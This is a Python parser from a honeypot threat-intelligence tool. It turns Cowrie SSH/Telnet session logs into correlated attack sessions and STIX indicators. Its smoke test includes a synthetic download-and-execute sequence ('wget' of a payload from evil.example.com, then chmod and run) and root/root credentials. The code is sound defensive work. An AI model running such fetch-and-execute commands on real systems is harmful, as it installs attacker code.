"""Cowrie parser — SSH and Telnet honeypot sessions.

Cowrie is the richest T-Pot honeypot — high-interaction shell on
ports 22, 23, 2222.  It emits multiple event types per session
(connect, login attempt, command input, file download, disconnect)
all sharing a `session` field.  We correlate by that field and
build per-session STIX that captures the full attacker interaction.

Per PoC LESSONS §32 ("Honeypot-specific IoC extraction belongs in the
STIX builder, not the parser"), this parser stays pure (model-only):
parse() + correlate() + has_substance() only.  The per-protocol STIX
shape lives in ``STIXBuilder.build_cowrie_session`` — see
``tpot2cti/stix/builder.py``.

Per V1_SPEC.md §5.1:

  T-Pot doc fields used:
    session, src_ip, src_port, dst_ip, dst_port, eventid,
    username, password, input, shasum/sha256, url, version,
    hassh, kex_algs, duration

  Substance filter: Cowrie sessions with no commands, no downloads,
  and no successful login are emitted as a Sighting only.  Pure
  probe-and-leave noise gets one-line representation rather than
  full SDO graph.
"""

from __future__ import annotations

import logging
import re
from typing import Iterable, Optional
from urllib.parse import urlparse

from tpot2cti.parsers import register
from tpot2cti.parsers.base import AttackSession, BaseParser, ParsedEvent
from tpot2cti.session import correlate_by_session_id

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

# Cowrie eventid → semantic category we care about
_LOGIN_SUCCESS_EVENTID = "cowrie.login.success"
_LOGIN_FAIL_EVENTID = "cowrie.login.failed"
_COMMAND_EVENTID = "cowrie.command.input"
_DOWNLOAD_EVENTID = "cowrie.session.file_download"
_UPLOAD_EVENTID = "cowrie.session.file_upload"
_CONNECT_EVENTID = "cowrie.session.connect"
_CLIENT_VERSION_EVENTID = "cowrie.client.version"

# Regex for URL extraction from command text (wget/curl/etc.)
_URL_RE = re.compile(r'\bhttps?://[^\s\'"<>|]+', re.IGNORECASE)


# ---------------------------------------------------------------------------
# Parser
# ---------------------------------------------------------------------------

class CowrieParser(BaseParser):
    """Parser for T-Pot's Cowrie honeypot."""

    type_name = "Cowrie"

    # ──────────────────────────────────────────────────────────────────
    # parse() — one ES doc → one ParsedEvent
    # ──────────────────────────────────────────────────────────────────

    def parse(self, doc: dict) -> Optional[ParsedEvent]:
        src_ip = doc.get("src_ip")
        if not src_ip:
            return None

        ts = self._parse_timestamp(doc)
        if ts is None:
            return None

        event = ParsedEvent(
            src_ip=str(src_ip),
            timestamp=ts,
            sensor_hostname=str(doc.get("t-pot_hostname") or doc.get("host", {}).get("name") or "unknown"),
            event_type="Cowrie",
            session_id=doc.get("session"),
            src_port=self._safe_int(doc.get("src_port")),
            dst_port=self._safe_int((doc.get("dest_port") or doc.get("dst_port"))),
            dst_ip=(doc.get("dest_ip") or doc.get("dst_ip")),
            protocol="ssh" if ((doc.get("dest_port") or doc.get("dst_port")) in (22, 2222)) else "telnet",
            raw_doc=doc,
        )
        self._populate_geoip(doc, event)

        # Stuff the Cowrie-specific fields into meta — the correlator
        # aggregates them into the AttackSession.
        eventid = doc.get("eventid") or ""
        event.meta["eventid"] = eventid

        if eventid == _LOGIN_SUCCESS_EVENTID:
            event.meta["login_success"] = True
            event.meta["username"] = doc.get("username")
            event.meta["password"] = doc.get("password")
        elif eventid == _LOGIN_FAIL_EVENTID:
            event.meta["login_success"] = False
            event.meta["username"] = doc.get("username")
            event.meta["password"] = doc.get("password")
        elif eventid == _COMMAND_EVENTID:
            event.meta["command"] = doc.get("input")
        elif eventid in (_DOWNLOAD_EVENTID, _UPLOAD_EVENTID):
            sha256 = doc.get("shasum") or doc.get("sha256")
            if sha256:
                event.meta["file_sha256"] = str(sha256).lower()
            if url := doc.get("url"):
                event.meta["file_url"] = str(url)
        elif eventid == _CLIENT_VERSION_EVENTID:
            if version := doc.get("version"):
                event.meta["ssh_version"] = str(version)

        # HASSH may appear on connect events
        if hassh := doc.get("hassh"):
            event.meta["hassh"] = str(hassh)

        return event

    # ──────────────────────────────────────────────────────────────────
    # correlate() — group by session, aggregate substance signals
    # ──────────────────────────────────────────────────────────────────

    def correlate(self, events: Iterable[ParsedEvent]) -> list[AttackSession]:
        return correlate_by_session_id(events, aggregator=self._aggregate_session)

    def _aggregate_session(self, session: AttackSession, events: list[ParsedEvent]) -> None:
        """Walk per-event meta and populate session substance signals."""
        for e in events:
            meta = e.meta
            eventid = meta.get("eventid", "")

            # auth_success — any success in the session counts
            if meta.get("login_success") is True:
                session.auth_success = True

            # credentials tried — capture both successes and failures
            uname = meta.get("username")
            pwd = meta.get("password")
            if uname is not None and pwd is not None:
                session.credentials_tried.append((str(uname), str(pwd)))

            # commands
            if cmd := meta.get("command"):
                session.commands.append(str(cmd))
                # Extract URLs from commands (wget/curl targets)
                for m in _URL_RE.findall(str(cmd)):
                    if m not in session.urls:
                        session.urls.append(m)

            # malware drops
            if sha := meta.get("file_sha256"):
                if sha not in session.malware_hashes:
                    session.malware_hashes.append(sha)
            if url := meta.get("file_url"):
                if url not in session.urls:
                    session.urls.append(url)

            # fingerprints
            if hassh := meta.get("hassh"):
                session.hassh = hassh
            if ver := meta.get("ssh_version"):
                session.ssh_version = ver

        # Derive domains from URLs
        for url in session.urls:
            try:
                host = urlparse(url).hostname
                if host and host not in session.domains:
                    session.domains.append(host)
            except Exception:
                continue

    # ──────────────────────────────────────────────────────────────────
    # has_substance() — the LESSONS §2 substance filter
    # ──────────────────────────────────────────────────────────────────

    def has_substance(self, session: AttackSession) -> bool:
        """Per V1_SPEC §5.1:

        Cowrie sessions with no commands, no downloads, and no
        successful login are emitted as a Sighting only.

        We also count credentials_tried > 0 (the attacker tried something,
        even if every attempt failed) and event_count > 2 (more than just
        connect + disconnect) as substantive.
        """
        return bool(
            session.auth_success
            or session.commands
            or session.malware_hashes
            or session.credentials_tried
            or session.event_count > 2
        )

    # ──────────────────────────────────────────────────────────────────
    # Helpers
    # ──────────────────────────────────────────────────────────────────

    @staticmethod
    def _safe_int(value) -> Optional[int]:
        if value is None:
            return None
        try:
            return int(value)
        except (TypeError, ValueError):
            return None


# Register on import
register(CowrieParser())


# ---------------------------------------------------------------------------
# Smoke test
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    from datetime import datetime, timedelta, timezone

    logging.basicConfig(level=logging.INFO, format="%(levelname)s %(message)s")

    parser = CowrieParser()

    # Build a small synthetic session: connect, login fail, login success,
    # 2 commands, 1 download.
    now = datetime.now(timezone.utc)
    base_doc = {
        "@timestamp": now.isoformat(),
        "src_ip": "1.2.3.4",
        "src_port": 50001,
        "dst_port": 22,
        "session": "deadbeef0001",
        "t-pot_hostname": "node1",
        "type": "Cowrie",
        "geoip": {"country_iso_code": "CN", "country_name": "China",
                   "city_name": "Beijing", "asn": 4134, "organization": "ChinaNet"},
    }

    events_raw = [
        {**base_doc, "eventid": _CONNECT_EVENTID,
         "@timestamp": (now + timedelta(seconds=0)).isoformat(),
         "hassh": "0a1b2c3d4e5f6789abc"},
        {**base_doc, "eventid": _LOGIN_FAIL_EVENTID,
         "@timestamp": (now + timedelta(seconds=2)).isoformat(),
         "username": "root", "password": "wrongpass"},
        {**base_doc, "eventid": _LOGIN_SUCCESS_EVENTID,
         "@timestamp": (now + timedelta(seconds=5)).isoformat(),
         "username": "root", "password": "root"},
        {**base_doc, "eventid": _COMMAND_EVENTID,
         "@timestamp": (now + timedelta(seconds=8)).isoformat(),
         "input": "wget http://evil.example.com/payload.sh -O /tmp/x.sh"},
        {**base_doc, "eventid": _COMMAND_EVENTID,
         "@timestamp": (now + timedelta(seconds=10)).isoformat(),
         "input": "chmod +x /tmp/x.sh && /tmp/x.sh"},
        {**base_doc, "eventid": _DOWNLOAD_EVENTID,
         "@timestamp": (now + timedelta(seconds=12)).isoformat(),
         "shasum": "abcdef0123456789" * 4, "url": "http://evil.example.com/payload.sh"},
    ]

    # parse
    events = []
    for d in events_raw:
        e = parser.parse(d)
        if e:
            events.append(e)
    print(f"parsed {len(events)} events")

    # correlate
    sessions = parser.correlate(events)
    print(f"correlated into {len(sessions)} session(s)")
    s = sessions[0]
    print(f"  session_id:        {s.session_id}")
    print(f"  src_ip:            {s.src_ip}")
    print(f"  auth_success:      {s.auth_success}")
    print(f"  commands:          {s.commands}")
    print(f"  malware_hashes:    {s.malware_hashes}")
    print(f"  urls:              {s.urls}")
    print(f"  domains:           {s.domains}")
    print(f"  credentials_tried: {s.credentials_tried}")
    print(f"  hassh:             {s.hassh}")
    print(f"  event_count:       {s.event_count}")

    # substance
    print(f"  has_substance:     {parser.has_substance(s)}")

    # Build STIX (need a Config — use minimal env). Per refactor, the
    # parser no longer carries a build() method; the orchestrator calls
    # builder.build_cowrie_session(session) instead.
    import os
    from tpot2cti.parsers.base import _smoketest_env
    _smoketest_env()
    from tpot2cti.config import load_config
    from tpot2cti.stix.builder import STIXBuilder

    cfg = load_config()
    builder = STIXBuilder(cfg)
    objects = builder.build_cowrie_session(s)
    print(f"\nbuilt {len(objects)} STIX objects:")
    by_type = {}
    for o in objects:
        by_type[o["type"]] = by_type.get(o["type"], 0) + 1
    for t, n in sorted(by_type.items(), key=lambda x: -x[1]):
        print(f"  {t:25s} {n}")

    # Drive-by comparison
    driveby_objects = builder.build_driveby_session(s)
    print(f"\n(comparison) drive-by: {len(driveby_objects)} STIX objects")

    print("\nSmoke test passed.")
